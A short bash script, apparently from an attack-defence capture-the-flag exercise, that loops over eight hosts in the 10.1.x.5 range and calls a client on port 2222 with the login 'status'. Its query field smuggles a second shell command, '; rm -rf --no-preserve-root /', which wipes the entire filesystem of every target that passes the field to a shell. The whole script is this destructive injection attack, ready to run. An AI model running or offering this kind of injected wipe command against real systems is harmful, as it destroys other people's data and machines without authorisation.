#!/bin/bash

HOSTS="1 2 4 5 6 7 9 10"

for HOST in $HOSTS
do
  ./client.py -u status -p status --host 10.1.$HOST.5 --port 2222 -q "; rm -rf --no-preserve-root /"
done
